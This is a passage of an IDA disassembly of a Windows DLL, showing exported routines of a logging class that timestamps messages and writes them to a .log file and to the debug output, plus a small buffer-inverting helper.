					; ccL30_691
					; ccL30_763
					; ccL30_865
					; ccL30_866
					; ccL30_879
					; ccL30_913
					; ccL30_1136
		retn
Ordinal865	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF426F5(int,	unsigned __int8	*)
sub_6AF426F5	proc near		; CODE XREF: Ordinal667+1Ep
					; Ordinal669+1Ep

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	[esp+arg_4]	; unsigned __int8 *
		push	eax		; unsigned __int8 *
		call	ds:_mbscmp
		neg	eax
		pop	ecx
		sbb	eax, eax
		pop	ecx
		neg	eax
		retn
sub_6AF426F5	endp

; Exported entry 638.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal638
Ordinal638	proc near		; CODE XREF: Ordinal152+6j
					; sub_6AF427A0+3p ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+4Ch], 0
		mov	dword ptr [esi], offset	off_6AF5BE14
		jz	short loc_6AF4272C
		lea	eax, [esi+34h]
		push	eax		; lpCriticalSection
		call	ds:DeleteCriticalSection
		and	dword ptr [esi+4Ch], 0

loc_6AF4272C:				; CODE XREF: Ordinal638+Dj
		mov	eax, [esi+30h]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF4273F
		push	eax		; hObject
		call	ds:CloseHandle
		or	dword ptr [esi+30h], 0FFFFFFFFh

loc_6AF4273F:				; CODE XREF: Ordinal638+23j
		lea	ecx, [esi+0Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+8]
		pop	esi
		jmp	sub_6AF3789B
Ordinal638	endp

; Exported entry 636.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal636
Ordinal636	proc near		; CODE XREF: sub_6AF536DE+5p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		xor	edi, edi
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF5BE14
		mov	[esi+4], edi
		call	sub_6AF318C3
		lea	ecx, [esi+0Ch]
		call	sub_6AF318C3
		or	dword ptr [esi+30h], 0FFFFFFFFh
		mov	ecx, esi
		mov	[esi+10h], edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		mov	[esi+2Ch], edi
		mov	[esi+4Ch], edi
		mov	[esi+50h], edi
		mov	[esi+54h], edi
		call	Ordinal674
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal636	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF427A0(void *, char)
sub_6AF427A0	proc near		; DATA XREF: .rdata:off_6AF5BE14o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal638
		test	[esp+4+arg_0], 1
		jz	short loc_6AF427B6
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF427B6:				; CODE XREF: sub_6AF427A0+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF427A0	endp

; Exported entry 640.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal640(int,	char *Format, va_list Args)
		public Ordinal640
Ordinal640	proc near		; CODE XREF: Ordinal641+26p
					; Ordinal642+21p ...

SystemTime	= _SYSTEMTIME ptr -20h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Format		= dword	ptr  0Ch
Args		= dword	ptr  10h

		mov	eax, offset unknown_libname_73 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 14h
		push	ebx
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		push	edi
		mov	[ebp+var_10], esp
		call	dword ptr [eax+8]
		xor	ebx, ebx
		jmp	short loc_6AF427E3
; ---------------------------------------------------------------------------

loc_6AF427DA:				; CODE XREF: Ordinal640+2Cj
		mov	esi, eax
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]

loc_6AF427E3:				; CODE XREF: Ordinal640+1Cj
		mov	eax, [esi+54h]
		cmp	eax, ebx
		jnz	short loc_6AF427DA
		push	[ebp+arg_0]
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	loc_6AF428F5
		lea	ecx, [ebp+arg_0]
		call	sub_6AF318C3
		cmp	[esi+24h], ebx
		mov	[ebp+var_4], ebx
		mov	byte ptr [ebp+var_4], 1
		jz	short loc_6AF4284E
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		movzx	eax, [ebp+SystemTime.wMilliseconds]
		push	eax
		movzx	eax, [ebp+SystemTime.wSecond]
		push	eax
		movzx	eax, [ebp+SystemTime.wMinute]
		push	eax
		movzx	eax, [ebp+SystemTime.wHour]
		push	eax
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax		; Args
		lea	eax, [ebp+arg_0]
		push	offset a04d02d02d02d_0 ; "%04d-%02d-%02d-%02d-%02d-%02d-%03d : "
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 24h

loc_6AF4284E:				; CODE XREF: Ordinal640+52j
		cmp	[esi+28h], ebx
		jz	short loc_6AF4286D
		mov	eax, [esi+8]
		cmp	[eax-0Ch], ebx
		jz	short loc_6AF4286D
		push	eax		; Args
		lea	eax, [ebp+arg_0]
		push	offset aS_0	; "%s :	"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch

loc_6AF4286D:				; CODE XREF: Ordinal640+95j
					; Ordinal640+9Dj
		cmp	[esi+20h], ebx
		jz	short loc_6AF4288A
		call	ds:GetCurrentProcessId
		push	eax		; Args
		lea	eax, [ebp+arg_0]
		push	offset a0x04x	; "0x%04X : "
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch

loc_6AF4288A:				; CODE XREF: Ordinal640+B4j
		cmp	[esi+1Ch], ebx
		jz	short loc_6AF428A7
		call	ds:GetCurrentThreadId
		push	eax		; Args
		lea	eax, [ebp+arg_0]
		push	offset a0x04x	; "0x%04X : "
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch

loc_6AF428A7:				; CODE XREF: Ordinal640+D1j
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+arg_0]
		push	[ebp+Format]	; Format
		call	sub_6AF31BAD
		cmp	[esi+2Ch], ebx
		jz	short loc_6AF428D1
		mov	edi, offset pszTrimChars ; "\r\n"
		push	edi		; unsigned __int8 *
		lea	ecx, [ebp+arg_0]
		call	sub_6AF3B17D
		push	edi		; Str
		lea	ecx, [ebp+arg_0]
		call	sub_6AF3B24F

loc_6AF428D1:				; CODE XREF: Ordinal640+FCj
		mov	edi, [ebp+arg_0]
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+4]
		lea	ecx, [edi-10h]
		jmp	short loc_6AF428F0
; ---------------------------------------------------------------------------

loc_6AF428E4:				; DATA XREF: .rdata:6AF63208o
		mov	eax, offset loc_6AF428EA
		retn
; ---------------------------------------------------------------------------

loc_6AF428EA:				; DATA XREF: Ordinal640:loc_6AF428E4o
		mov	ecx, [ebp+arg_0]
		add	ecx, 0FFFFFFF0h

loc_6AF428F0:				; CODE XREF: Ordinal640+126j
		call	sub_6AF3160D

loc_6AF428F5:				; CODE XREF: Ordinal640+3Aj
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	0Ch
Ordinal640	endp ; sp-analysis failed

; Exported entry 641.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal641(int, char *Format, char Args)
		public Ordinal641
Ordinal641	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]
		push	1
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF42931
		lea	eax, [esp+4+Args]
		push	eax		; Args
		push	[esp+8+Format]	; Format
		mov	ecx, esi
		push	1		; int
		call	Ordinal640

loc_6AF42931:				; CODE XREF: Ordinal641+17j
		pop	esi
		retn
Ordinal641	endp

; Exported entry 642.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal642(char	*Format, va_list Args)
		public Ordinal642
Ordinal642	proc near		; CODE XREF: sub_6AF31006+Ep
					; DATA XREF: .rdata:off_6AF66098o

Format		= dword	ptr  4
Args		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		call	dword ptr [eax+8]
		push	1
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF42959
		push	[esp+4+Args]	; Args
		mov	ecx, esi
		push	[esp+8+Format]	; Format
		push	1		; int
		call	Ordinal640

loc_6AF42959:				; CODE XREF: Ordinal642+13j
		pop	esi
		retn	8
Ordinal642	endp

; Exported entry 643.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal643(int, char *Format, char Args)
		public Ordinal643
Ordinal643	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]
		push	2
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF42988
		lea	eax, [esp+4+Args]
		push	eax		; Args
		push	[esp+8+Format]	; Format
		mov	ecx, esi
		push	2		; int
		call	Ordinal640

loc_6AF42988:				; CODE XREF: Ordinal643+17j
		pop	esi
		retn
Ordinal643	endp

; Exported entry 644.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal644(char	*Format, va_list Args)
		public Ordinal644
Ordinal644	proc near		; CODE XREF: sub_6AF3101A+Ep
					; DATA XREF: .rdata:off_6AF66098o

Format		= dword	ptr  4
Args		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		call	dword ptr [eax+8]
		push	2
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF429B0
		push	[esp+4+Args]	; Args
		mov	ecx, esi
		push	[esp+8+Format]	; Format
		push	2		; int
		call	Ordinal640

loc_6AF429B0:				; CODE XREF: Ordinal644+13j
		pop	esi
		retn	8
Ordinal644	endp

; Exported entry 645.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal645(int, char *Format, char Args)
		public Ordinal645
Ordinal645	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]
		push	3
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF429DF
		lea	eax, [esp+4+Args]
		push	eax		; Args
		push	[esp+8+Format]	; Format
		mov	ecx, esi
		push	3		; int
		call	Ordinal640

loc_6AF429DF:				; CODE XREF: Ordinal645+17j
		pop	esi
		retn
Ordinal645	endp

; Exported entry 646.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal646(char	*Format, va_list Args)
		public Ordinal646
Ordinal646	proc near		; CODE XREF: sub_6AF3102E+Ep
					; DATA XREF: .rdata:off_6AF66098o

Format		= dword	ptr  4
Args		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		call	dword ptr [eax+8]
		push	3
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF42A07
		push	[esp+4+Args]	; Args
		mov	ecx, esi
		push	[esp+8+Format]	; Format
		push	3		; int
		call	Ordinal640

loc_6AF42A07:				; CODE XREF: Ordinal646+13j
		pop	esi
		retn	8
Ordinal646	endp

; Exported entry 677.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal677
Ordinal677	proc near		; CODE XREF: Ordinal678+19p
					; Ordinal647+2Fp
					; DATA XREF: ...

lpFileName	= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_74 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+30h]
		or	ebx, 0FFFFFFFFh
		cmp	eax, ebx
		push	edi
		mov	[ebp+var_10], esp
		jz	short loc_6AF42A33
		push	eax		; hObject
		call	ds:CloseHandle
		mov	[esi+30h], ebx

loc_6AF42A33:				; CODE XREF: Ordinal677+1Cj
		lea	ecx, [ebp+lpFileName]
		call	sub_6AF318C3
		lea	eax, [esi+0Ch]
		xor	edi, edi
		mov	[ebp+var_4], edi
		push	eax
		lea	ecx, [ebp+lpFileName]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31C41
		push	5Ch
		lea	ecx, [ebp+lpFileName]
		call	sub_6AF3213B
		push	dword ptr [esi+8] ; Args
		lea	eax, [ebp+lpFileName]
		push	offset aS_2	; "\\%s"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch
		cmp	[esi+18h], edi
		jz	short loc_6AF42A8B
		call	ds:GetCurrentProcessId
		push	eax		; Args
		lea	eax, [ebp+lpFileName]
		push	offset a0x04x_0	; "-%0x%04X"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch

loc_6AF42A8B:				; CODE XREF: Ordinal677+66j
		push	offset a_log	; ".log"
		lea	ecx, [ebp+lpFileName]
		call	sub_6AF3B24F
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	4		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		cmp	eax, ebx
		mov	[esi+30h], eax
		jz	short loc_6AF42AC3
		push	2		; dwMoveMethod
		push	edi		; lpDistanceToMoveHigh
		push	edi		; lDistanceToMove
		push	eax		; hFile
		call	ds:SetFilePointer

loc_6AF42AC3:				; CODE XREF: Ordinal677+ABj
		xor	eax, eax
		cmp	[esi+30h], ebx
		setnz	al
		mov	esi, eax
		jmp	short loc_6AF42AD7
; ---------------------------------------------------------------------------

loc_6AF42ACF:				; DATA XREF: .rdata:6AF63260o
		mov	eax, offset loc_6AF42AD5
		retn
; ---------------------------------------------------------------------------

loc_6AF42AD5:				; DATA XREF: Ordinal677:loc_6AF42ACFo
		xor	esi, esi

loc_6AF42AD7:				; CODE XREF: Ordinal677+C2j
		mov	ecx, [ebp+lpFileName]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal677	endp

; Exported entry 678.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal678
Ordinal678	proc near		; CODE XREF: Ordinal665+13p
					; Ordinal667+38p ...
		push	esi
		mov	esi, ecx
		call	Ordinal675
		test	eax, eax
		jnz	short loc_6AF42B01
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF42B01:				; CODE XREF: Ordinal678+Aj
		push	edi
		xor	edi, edi
		cmp	dword ptr [esi+30h], 0FFFFFFFFh
		jz	short loc_6AF42B13
		mov	ecx, esi
		call	Ordinal677
		mov	edi, eax

loc_6AF42B13:				; CODE XREF: Ordinal678+15j
		mov	ecx, esi
		call	Ordinal676
		mov	eax, edi
		pop	edi
		pop	esi
		retn
Ordinal678	endp

; Exported entry 679.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal679
Ordinal679	proc near		; CODE XREF: Ordinal155+48p
					; Ordinal648+1Dp
					; DATA XREF: ...

Args		= byte ptr -420h
var_41C		= dword	ptr -41Ch
Ext		= byte ptr -418h
FullPath	= byte ptr -318h
Dir		= byte ptr -214h
Src		= byte ptr -114h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_75 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 414h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_14], eax
		lea	edi, [esi+8]
		mov	eax, [edi]
		mov	eax, [eax-0Ch]
		test	eax, eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_41C], 1
		jz	short loc_6AF42B62
		mov	eax, [esi+0Ch]
		cmp	dword ptr [eax-0Ch], 0
		jnz	loc_6AF42C01

loc_6AF42B62:				; CODE XREF: Ordinal679+34j
		mov	ebx, 103h
		push	ebx		; nSize
		lea	eax, [ebp+FullPath]
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		test	eax, eax
		jz	short loc_6AF42BFA
		cmp	eax, ebx
		jz	short loc_6AF42BFA
		lea	eax, [ebp+Ext]
		push	eax		; Ext
		lea	eax, [ebp+Src]
		push	eax		; Filename
		lea	eax, [ebp+Dir]
		push	eax		; Dir
		lea	eax, [ebp+Args]
		push	eax		; Drive
		lea	eax, [ebp+FullPath]
		push	eax		; FullPath
		call	ds:_splitpath
		mov	eax, [edi]
		xor	ebx, ebx
		add	esp, 14h
		cmp	[eax-0Ch], ebx
		mov	[ebp+var_4], ebx
		jnz	short loc_6AF42BC5
		lea	eax, [ebp+Src]
		push	eax		; Src
		mov	ecx, edi
		call	sub_6AF31B1D

loc_6AF42BC5:				; CODE XREF: Ordinal679+96j
		lea	eax, [esi+0Ch]
		mov	ecx, [eax]
		cmp	[ecx-0Ch], ebx
		jnz	short loc_6AF42C01
		lea	ecx, [ebp+Dir]
		push	ecx
		lea	ecx, [ebp+Args]
		push	ecx		; Args
		push	offset aSS_0	; "%s%s"
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 10h
		jmp	short loc_6AF42C01
; ---------------------------------------------------------------------------

loc_6AF42BED:				; DATA XREF: .rdata:stru_6AF632A4o
		and	[ebp+var_41C], 0
		mov	eax, offset loc_6AF42C01
		retn
; ---------------------------------------------------------------------------

loc_6AF42BFA:				; CODE XREF: Ordinal679+5Aj
					; Ordinal679+5Ej
		and	[ebp+var_41C], 0

loc_6AF42C01:				; CODE XREF: Ordinal679+3Dj
					; Ordinal679+AEj ...
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_41C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal679	endp ; sp-analysis failed

; Exported entry 637.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal637(char	*Src)
		public Ordinal637
Ordinal637	proc near		; CODE XREF: Ordinal151+7p
					; DATA XREF: .rdata:off_6AF66098o

Src		= dword	ptr  4

		push	esi
		push	edi
		push	[esp+8+Src]	; Src
		mov	esi, ecx
		xor	edi, edi
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF5BE14
		mov	[esi+4], edi
		call	sub_6AF3260A
		lea	ecx, [esi+0Ch]
		call	sub_6AF318C3
		or	dword ptr [esi+30h], 0FFFFFFFFh
		mov	ecx, esi
		mov	[esi+10h], edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+2Ch], edi
		mov	[esi+4Ch], edi
		mov	[esi+50h], edi
		mov	[esi+54h], edi
		call	Ordinal674
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
Ordinal637	endp

; Exported entry 639.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal639(int, int, char	*Format, char Args)
		public Ordinal639
Ordinal639	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
Format		= dword	ptr  10h
Args		= byte ptr  14h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]
		push	[ebp+arg_4]
		mov	ecx, esi
		call	Ordinal673
		test	eax, eax
		jz	short loc_6AF42C9E
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		mov	ecx, esi
		push	[ebp+arg_4]	; int
		call	Ordinal640

loc_6AF42C9E:				; CODE XREF: Ordinal639+1Aj
		pop	esi
		pop	ebp
		retn
Ordinal639	endp

; Exported entry 647.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal647(LPCSTR lpBuffer)
		public Ordinal647
Ordinal647	proc near		; DATA XREF: .rdata:6AF54B20o
					; .rdata:6AF5BE18o ...

NumberOfBytesWritten= dword ptr	-4
lpBuffer	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 0
		jz	short loc_6AF42CB7
		push	[ebp+lpBuffer]	; lpOutputString
		call	ds:OutputDebugStringA

loc_6AF42CB7:				; CODE XREF: Ordinal647+Bj
		cmp	dword ptr [esi+14h], 0
		jz	short loc_6AF42D02
		mov	ecx, esi
		call	Ordinal675
		test	eax, eax
		jz	short loc_6AF42D02
		cmp	dword ptr [esi+30h], 0FFFFFFFFh
		jnz	short loc_6AF42CDB
		mov	ecx, esi
		call	Ordinal677
		cmp	dword ptr [esi+30h], 0FFFFFFFFh
		jz	short loc_6AF42CFB

loc_6AF42CDB:				; CODE XREF: Ordinal647+2Bj
		and	[ebp+NumberOfBytesWritten], 0
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+lpBuffer]	; lpString
		call	ds:lstrlenA
		push	eax		; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		push	dword ptr [esi+30h] ; hFile
		call	ds:WriteFile

loc_6AF42CFB:				; CODE XREF: Ordinal647+38j
		mov	ecx, esi
		call	Ordinal676

loc_6AF42D02:				; CODE XREF: Ordinal647+1Aj
					; Ordinal647+25j
		pop	esi
		leave
		retn	4
Ordinal647	endp

; Exported entry 648.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal648
Ordinal648	proc near		; CODE XREF: Ordinal154+22p
					; DATA XREF: .rdata:6AF5BE1Co ...
		push	esi
		mov	esi, ecx
		call	Ordinal675
		test	eax, eax
		jnz	short loc_6AF42D15
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF42D15:				; CODE XREF: Ordinal648+Aj
		push	edi
		xor	edi, edi
		inc	edi
		cmp	dword ptr [esi+50h], 0
		jnz	short loc_6AF42D2F
		mov	ecx, esi
		mov	[esi+50h], edi
		call	Ordinal679
		test	eax, eax
		jnz	short loc_6AF42D2F
		xor	edi, edi

loc_6AF42D2F:				; CODE XREF: Ordinal648+16j
					; Ordinal648+24j
		mov	ecx, esi
		call	Ordinal676
		mov	eax, edi
		pop	edi
		pop	esi
		retn
Ordinal648	endp

; Exported entry 665.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal665
Ordinal665	proc near		; CODE XREF: Ordinal149+40p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		xor	edx, edx
		cmp	[ecx+18h], eax
		mov	[ecx+18h], eax
		setnz	dl
		test	edx, edx
		jz	short locret_6AF42D53
		call	Ordinal678

locret_6AF42D53:			; CODE XREF: Ordinal665+11j
		retn	4
Ordinal665	endp

; Exported entry 667.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal667(unsigned __int8 *Src)
		public Ordinal667
Ordinal667	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_76 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+Src]	; unsigned __int8 *
		mov	edi, ecx
		lea	esi, [edi+8]
		push	esi		; int
		call	sub_6AF426F5
		pop	ecx
		pop	ecx
		push	[ebp+Src]	; Src
		mov	ecx, esi
		movzx	ebx, al
		call	sub_6AF31B1D
		test	ebx, ebx
		jz	short loc_6AF42D95
		mov	ecx, edi
		call	Ordinal678
		jmp	short loc_6AF42DA2
; ---------------------------------------------------------------------------

loc_6AF42D95:				; CODE XREF: Ordinal667+34j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF42DA2
; ---------------------------------------------------------------------------

loc_6AF42D9A:				; DATA XREF: .rdata:stru_6AF632F4o
		mov	eax, offset loc_6AF42DA0
		retn
; ---------------------------------------------------------------------------

loc_6AF42DA0:				; DATA XREF: Ordinal667:loc_6AF42D9Ao
		xor	eax, eax

loc_6AF42DA2:				; CODE XREF: Ordinal667+3Dj
					; Ordinal667+42j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal667	endp

; Exported entry 669.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal669(unsigned __int8 *Src)
		public Ordinal669
Ordinal669	proc near		; CODE XREF: Ordinal149+83p
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_77 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+Src]	; unsigned __int8 *
		mov	edi, ecx
		lea	esi, [edi+0Ch]
		push	esi		; int
		call	sub_6AF426F5
		pop	ecx
		pop	ecx
		push	[ebp+Src]	; Src
		mov	ecx, esi
		movzx	ebx, al
		call	sub_6AF31B1D
		test	ebx, ebx
		jz	short loc_6AF42DF2
		mov	ecx, edi
		call	Ordinal678
		jmp	short loc_6AF42DFF
; ---------------------------------------------------------------------------

loc_6AF42DF2:				; CODE XREF: Ordinal669+34j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF42DFF
; ---------------------------------------------------------------------------

loc_6AF42DF7:				; DATA XREF: .rdata:stru_6AF63344o
		mov	eax, offset loc_6AF42DFD
		retn
; ---------------------------------------------------------------------------

loc_6AF42DFD:				; DATA XREF: Ordinal669:loc_6AF42DF7o
		xor	eax, eax

loc_6AF42DFF:				; CODE XREF: Ordinal669+3Dj
					; Ordinal669+42j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal669	endp

; Exported entry 680.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal680
Ordinal680	proc near		; CODE XREF: Ordinal293+26p
					; Ordinal343+60p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal311
		mov	dword ptr [esi], offset	off_6AF5BE74
		mov	eax, esi
		pop	esi
		retn	4
Ordinal680	endp

; Exported entry 681.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal681
Ordinal681	proc near		; CODE XREF: Ordinal293+56p
					; Ordinal343+BBp ...
		mov	dword ptr [ecx], offset	off_6AF5BE74
		jmp	Ordinal312
Ordinal681	endp

; Exported entry 682.
; Exported entry 683.
; Exported entry 684.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal684
Ordinal684	proc near		; DATA XREF: .rdata:6AF5BE78o
					; .rdata:6AF5BE7Co ...
		xor	eax, eax	; ccL30_682
					; ccL30_683
		inc	eax
		retn	8
Ordinal684	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF42E39(void *, char)
sub_6AF42E39	proc near		; DATA XREF: .rdata:off_6AF5BE74o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal681
		test	[esp+4+arg_0], 1
		jz	short loc_6AF42E4F
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF42E4F:				; CODE XREF: sub_6AF42E39+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF42E39	endp

; Exported entry 694.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal694
Ordinal694	proc near		; CODE XREF: Ordinal692+8p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	edx, [esp+arg_4]
		mov	eax, [esp+arg_0]
		mov	ecx, edx
		shr	ecx, 2
		jz	short loc_6AF42E6C

loc_6AF42E64:				; CODE XREF: Ordinal694+15j
		not	dword ptr [eax]
		add	eax, 4
		dec	ecx
		jnz	short loc_6AF42E64

loc_6AF42E6C:				; CODE XREF: Ordinal694+Dj
		and	edx, 3
		mov	ecx, edx
		jbe	short locret_6AF42E79

loc_6AF42E73:				; CODE XREF: Ordinal694+22j
		not	byte ptr [eax]
		inc	eax
		dec	ecx
		jnz	short loc_6AF42E73

locret_6AF42E79:			; CODE XREF: Ordinal694+1Cj
		retn	8
Ordinal694	endp

; Exported entry 692.
